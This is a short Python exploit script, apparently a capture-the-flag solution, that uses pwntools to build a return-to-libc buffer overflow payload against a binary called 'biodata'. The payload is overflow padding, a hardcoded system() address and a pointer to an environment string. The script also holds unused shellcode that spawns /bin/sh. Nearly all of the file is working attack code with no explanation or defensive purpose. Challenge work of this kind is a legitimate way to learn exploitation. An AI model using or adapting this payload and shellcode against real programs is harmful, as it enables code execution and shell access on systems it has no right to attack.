#!/usr/bin/env python
import struct
from pwn import *
import os

#context.clear(arch='amd64', kernel='amd64')

#ex = process('biodata')

#inp = ex.recv()
#log.info("Printed: "+inp)

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
buff_length = 0x1c
ebp = 0xffffda88
#ebp = 0xffffd7cc

#return_ptr = ebp - buff_length + 2
system_ptr = 0xf7e43940
#address of env variable set by me to "cat flag.txt"
binsh_ptr = 0xffffdd19
#binsh_ptr = 0xf7f6202b
#print format(return_ptr,'x')
#print struct.pack("<I",return_ptr)

payload = ""
payload += "A"*(buff_length+4)
payload += struct.pack("<I",system_ptr)
payload += "B"*4
payload += struct.pack("<I",binsh_ptr)

print  payload
#gdb.attach(ex)
#raw_input("Send payload?")

#ex.sendline(payload)
#ex.recv()

#os.system('sleep 2')

#ex.interactive()
#ex.sendline('cat flag.txt')
#flag = ex.recv()
#print flag
